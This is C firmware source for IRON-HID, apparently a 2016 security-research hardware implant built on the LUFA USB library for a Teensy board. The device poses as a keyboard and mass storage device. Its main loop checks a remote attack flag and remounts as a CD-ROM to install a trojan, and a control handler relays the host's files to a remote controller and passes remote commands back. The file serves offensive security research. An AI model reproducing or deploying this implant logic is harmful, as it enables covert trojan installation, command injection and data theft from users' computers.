/*
            IRON-HID Firmware for At90USB1286 in Teensy2.0++       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/


/*
             LUFA Library
     Copyright (C) Dean Camera, 2010.
              
  dean [at] fourwalledcubicle [dot] com
      www.fourwalledcubicle.com
*/

/*
  Copyright 2010  Dean Camera (dean [at] fourwalledcubicle [dot] com)
  Copyright 2010  Matthias Hullin (lufa [at] matthias [dot] hullin [dot] net)

  Permission to use, copy, modify, distribute, and sell this 
  software and its documentation for any purpose is hereby granted
  without fee, provided that the above copyright notice appear in 
  all copies and that both that the copyright notice and this
  permission notice and warranty disclaimer appear in supporting 
  documentation, and that the name of the author not be used in 
  advertising or publicity pertaining to distribution of the 
  software without specific, written prior permission.

  The author disclaim all warranties with regard to this
  software, including all implied warranties of merchantability
  and fitness.  In no event shall the author be liable for any
  special, indirect or consequential damages or any damages
  whatsoever resulting from loss of use, data or profits, whether
  in an action of contract, negligence or other tortious action,
  arising out of or in connection with the use or performance of
  this software.
*/

extern "C"
{
#include "KeyboardFirmware.h"
#include <avr/sleep.h>
#include <avr/power.h>
#include <avr/wdt.h>
#include "Lib/core_pins.h"
};

#include "KeyboardMain.h"

// Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver.
uint8_t PrevKeyboardHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

// Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver.
uint8_t PrevUserHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

// TODO: Make header file
extern void setup();

/** 
 * 	LUFA HID Class driver interface configuration and state information. This structure is
 *  passed to all HID Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_HID_Device_t Keyboard_HID_Interface =
 	{
		.Config =
			{
				.InterfaceNumber              = KEYBOARD_IFNUM,

				.ReportINEndpointNumber       = KEYBOARD_EPNUM,
				.ReportINEndpointSize         = KEYBOARD_EPSIZE,
				.ReportINEndpointDoubleBank   = false,

				.PrevReportINBuffer           = PrevKeyboardHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevKeyboardHIDReportBuffer),
			},
    };

/**
 *	Interface for communication between host and keyboard.
 */
USB_ClassInfo_HID_Device_t User_HID_Interface =
 	{
		.Config =
			{
				.InterfaceNumber              = USER_IFNUM,

				.ReportINEndpointNumber       = USER_EPNUM,
				.ReportINEndpointSize         = USER_EPSIZE,
				.ReportINEndpointDoubleBank   = false,

				.PrevReportINBuffer           = PrevUserHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevUserHIDReportBuffer),
			},
    };

/**
 *	LUFA Mass Storage Class driver interface configuration and state information. This structure is
 *  passed to all Mass Storage Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_MS_Device_t Disk_MS_Interface =
	{
		.Config =
			{
				.InterfaceNumber           = MASS_STORAGE_IFNUM,

				.DataINEndpointNumber      = MASS_STORAGE_IN_EPNUM,
				.DataINEndpointSize        = MASS_STORAGE_IO_EPSIZE,
				.DataINEndpointDoubleBank  = false,

				.DataOUTEndpointNumber     = MASS_STORAGE_OUT_EPNUM,
				.DataOUTEndpointSize       = MASS_STORAGE_IO_EPSIZE,
				.DataOUTEndpointDoubleBank = false,

				.TotalLUNs                 = TOTAL_LUNS,
			},
	};

// USB Report Buffer
USB_KeyboardReport_Data_t g_stKeyboardReport;

// Attack Mode
volatile uint8_t g_bAttackMode = 0;
volatile uint8_t g_bGetFeatureRecved = 0;

/** 
 * 	Main program entry point. This routine contains the overall program flow, including initial
 *  setup of all components and the main program loop.
 */
int main(void)
{
	SetupHardware();
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);

	// Waiting for stable state
	sei();
	_delay_ms(3000);

	pinMode(6, OUTPUT);
	digitalWrite(6, LOW);

	// Setup boards
	setup();

	for (;;)
	{
		MS_Device_USBTask(&Disk_MS_Interface);
		HID_Device_USBTask(&Keyboard_HID_Interface);
		HID_Device_USBTask(&User_HID_Interface);
		USB_USBTask();

		// Check the attack flag from the IRON-HID Commander
		CheckAndInstallTrojan();

		loop();
	}
}

/** 
 *	Configures the board hardware and chip peripherals. 
 */
void SetupHardware(void)
{
	// Disable watchdog if enabled by bootloader/fuses 
	MCUSR &= ~(1 << WDRF);
	wdt_disable();

	// Disable clock division 
	clock_prescale_set(clock_div_1);

	// Hardware Initialization 
	LEDs_Init();
	//Serial_Init(115200, true);
	USB_Init();

	// Start the flush timer so that overflows occur rapidly to push received bytes to the USB interface 
	TCCR0B = (1 << CS02);
}

/** 
 *	Event handler for the library USB Connection event. 
 */
void EVENT_USB_Device_Connect(void)
{
	LEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);
}

/** 
 *	Event handler for the library USB Disconnection event. 
 */
void EVENT_USB_Device_Disconnect(void)
{
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
}

/** 
 *	Event handler for the library USB Configuration Changed event. 
 */
void EVENT_USB_Device_ConfigurationChanged(void)
{
	if (!(MS_Device_ConfigureEndpoints(&Disk_MS_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	if (!(HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	if (!(HID_Device_ConfigureEndpoints(&User_HID_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	USB_Device_EnableSOFEvents();
}

/** 
 * 	Handle Control Transfer.
 */
bool Process_USB_Device_ControlRequest(void)
{
	int i;
	char vcBuffer[FILE_CHUNK_SIZE + 1];
	uint16_t iReportSize;
	uint8_t  iReportID = 0;
	uint8_t  iReportType = 0;
	uint16_t iRemainSize;
	uint16_t iTemp;

	if (USB_ControlRequest.wIndex != USER_IFNUM)
	{
		return false;
	}

	if (((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_TYPE) == REQTYPE_CLASS) && 
		((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_RECIPIENT) == REQREC_INTERFACE))
	{
		iReportSize = USB_ControlRequest.wLength;
		iReportID   = (USB_ControlRequest.wValue & 0xFF);
		iReportType = (USB_ControlRequest.wValue >> 8) - 1;
		
		// Send host's file or data to the remote
		if ((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_DIRECTION) == REQDIR_HOSTTODEVICE)
		{
			Endpoint_ClearSETUP();
			iRemainSize = iReportSize;

			for (i = 0 ; i < (iReportSize + sizeof(vcBuffer) - 1) / sizeof(vcBuffer)  ; i++)
			{
				iTemp = sizeof(vcBuffer);
				if (iRemainSize < sizeof(vcBuffer))
				{
					iTemp = iRemainSize;
				}
				Endpoint_Read_Control_Stream_LE(vcBuffer, iTemp);

				// Send except report ID
				SendFileDataToRemote(vcBuffer + 1, iTemp - 1);
				
				iRemainSize -= iTemp;
			}
			Endpoint_ClearStatusStage();
		}
		// Get command from remote(android smartphone)
		else
		{
			// Send command request to Commander
			Endpoint_ClearSETUP();
			Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);
			
			GetRemoteCMDFromBuffer(vcBuffer, FILE_CHUNK_SIZE);
					
			// Send to Host
			Endpoint_Write_Control_Stream_LE(vcBuffer, FILE_CHUNK_SIZE);
			
			Endpoint_ClearOUT();

			if (g_bAttackMode == 1)
			{
				g_bGetFeatureRecved = 1;
			}
		}
		return true;
	}
	else
	{
	}
	return false;
}

/** 
 *	Event handler for the library USB Unhandled Control Request event. 
 */
void EVENT_USB_Device_UnhandledControlRequest(void)
{
	MS_Device_ProcessControlRequest(&Disk_MS_Interface);
	HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
	//HID_Device_ProcessControlRequest(&User_HID_Interface);
	
	Process_USB_Device_ControlRequest();
}

/** 
 *	Mass Storage class driver callback function the reception of SCSI commands from the host, which must be processed.
 *
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface configuration structure being referenced
 */
bool CALLBACK_MS_Device_SCSICommandReceived(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
	bool CommandSuccess;
	
	LEDs_SetAllLEDs(LEDMASK_USB_BUSY);
	CommandSuccess = SCSI_DecodeSCSICommand(MSInterfaceInfo);
	LEDs_SetAllLEDs(LEDMASK_USB_READY);
	
	return CommandSuccess;
}

/** 
 *	Event handler for the USB device Start Of Frame event. 
 */
void EVENT_USB_Device_StartOfFrame(void)
{
    HID_Device_MillisecondElapsed(&Keyboard_HID_Interface);
    HID_Device_MillisecondElapsed(&User_HID_Interface);
}

/** 
 *	HID class driver callback function for the creation of HID reports to the host.
 *
 *  \param[in]     HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in,out] ReportID    Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID
 *  \param[in]     ReportType  Type of the report to create, either REPORT_ITEM_TYPE_In or REPORT_ITEM_TYPE_Feature
 *  \param[out]    ReportData  Pointer to a buffer where the created report should be stored
 *  \param[out]    ReportSize  Number of bytes written in the report (or zero if no report is to be sent
 *
 *  \return Boolean true to force the sending of the report, false to let the library determine if it needs to be sent
 */
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                         uint8_t* const ReportID,
                                         const uint8_t ReportType,
                                         void* ReportData,
                                         uint16_t* const ReportSize)
{
#ifdef MATIAS_LAPTOP_PRO
	// If bluetooth keyboard, send key only wireless
	*ReportSize = 0;
	return false;
#endif

	USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)ReportData;
	int i;

	// TODO: Merge these functions
	SendKeyToHost(false);
	ProcessKeyData();

	KeyboardReport->Modifier = g_stKeyboardReport.Modifier;
	for (i = 0 ; i < 6 ; i++)
	{
		KeyboardReport->KeyCode[i] = g_stKeyboardReport.KeyCode[i];
	}
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	return true;
}

/** 
 *	HID class driver callback function for the processing of HID reports from the host.
 *
 *  \param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in] ReportID    Report ID of the received report from the host
 *  \param[in] ReportType  The type of report that the host has sent, either REPORT_ITEM_TYPE_Out or REPORT_ITEM_TYPE_Feature
 *  \param[in] ReportData  Pointer to a buffer where the created report has been stored
 *  \param[in] ReportSize  Size in bytes of the received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                          const uint8_t ReportID,
                                          const uint8_t ReportType,
                                          const void* ReportData,
                                          const uint16_t ReportSize)
{
	uint8_t* LEDReport = (uint8_t*)ReportData;
	
	//Serial_TxString("D;;HID Proc;");
	// HID_KEYBOARD_LED_NUMLOCK 	: 0x01
	// HID_KEYBOARD_LED_CAPSLOCK	: 0x02
	// HID_KEYBOARD_LED_SCROLLLOCK	: 0x04
	// Send LED Status
	SetLEDState(*LEDReport);
}

/**
 *	Key Data Process
 *	Modifier, Reserved, 6 Keys
 */
void ProcessKeyData()
{		
	// Copy from temp buffer to report buffer
	memcpy(&g_stKeyboardReport, &g_stReport, sizeof(g_stKeyboardReport));
}

/**
 *	Check the attack flag from the Atmega2560 and mount CD-ROM to install the 
 *	trojan. 
 */
void CheckAndInstallTrojan()
{
	// Mount Start	
	if (g_cAttackStart == 0x01)
	{
		ConnectCDROM();
		g_cAttackStart = 0;
	}
	else
	{
		// If attack mode is set and get feature is received, disconnect CD-ROM
		if ((g_bAttackMode == 1) && (g_bGetFeatureRecved == 1))
		{
			DisconnectCDROM();
		}
	}
}

/**
 *	Connect CD-ROM
 */
void ConnectCDROM(void)
{
	USB_Detach();
	
	_delay_ms(100);
	g_bAttackMode = 1;

	USB_Attach();
}

/**
 *	disconnect CD-ROM
 */
void DisconnectCDROM(void)
{
	USB_Detach();
	
	_delay_ms(100);
	g_bAttackMode = 0;
	g_bGetFeatureRecved = 0;

	USB_Attach();
}



/**
 *	Sleep.
 */
void EnterSleep(void)
{
	set_sleep_mode(SLEEP_MODE_IDLE);
	//set_sleep_mode(SLEEP_MODE_PWR_SAVE);
	  
	sleep_enable();

	/* Disable all of the unused peripherals. This will reduce power
	* consumption further and, more importantly, some of these
	* peripherals may generate interrupts that will wake our Arduino from
	* sleep!
	*/
	power_timer1_enable();
	SetupTimer();

	/* Now enter sleep mode. */
	sleep_mode();

	/* The program will continue from here after the timer timeout*/
	sleep_disable(); /* First thing to do is disable sleep. */

	/* Re-enable the peripherals. */
	//power_all_enable();
	power_timer1_disable();
}

/**
 *	Deep Sleep.
 */
void EnterDeepSleep(void)
{
	wdt_enable(WDTO_2S);
	
	// Enable Watchdog Interrupt
	WDTCSR |= _BV(WDIE);
	
	set_sleep_mode(SLEEP_MODE_PWR_DOWN);   
	sleep_enable();
	  
	// Now enter sleep mode. 
	sleep_mode();
				
	/* The program will continue from here after the WDT timeout*/
	
	sleep_disable(); 	
	wdt_disable();
	
	// Re-enable the peripherals.
	//power_all_enable();
}

/**
 *	Timer Setup.
 */
void SetupTimer()
{
	/* Normal timer operation.*/
	TCCR1A = 0x00; 

	/* Clear the timer counter register.
	*/
	TCNT1 = 0xFF00; 

	/* Configure the prescaler(No prescailer), total 0.5ms
	* 0x00 : Stop timer
	* 0x01 : 1:1  -> 0.5ms
	* 0x02 : 1:8  -> 4.09ms
	* 0x03 : 1:64
	* 0x04 : 1:256
	* 0x05 : 1:1024
	*/
	TCCR1B = 0x02;

	/* Enable the timer overlow interrupt. */
	TIMSK1 = 0x01;
}

/**
 *	My Simple ItoA.
 */
void MyItoA(char* pcBuffer, int iValue)
{
	int iTemp;
	int iIndex;
	char cTemp;
	int i;

	iTemp = iValue;
	if (iTemp == 0)
	{
		pcBuffer[0] = '0';
		pcBuffer[1] = '\0';
		return ;
	}

	iIndex = 0;
	while(iTemp != 0)
	{
		pcBuffer[iIndex] = iTemp % 10 + '0';
		iIndex++;

		iTemp = iTemp / 10;
	}

	pcBuffer[iIndex] = '\0';

	// Swap
	for (i = 0 ; i < iIndex / 2 ; i++)
	{
		cTemp = pcBuffer[i];
		pcBuffer[i] = pcBuffer[iIndex - i - 1];
		pcBuffer[iIndex - i - 1] = cTemp;
	}
}


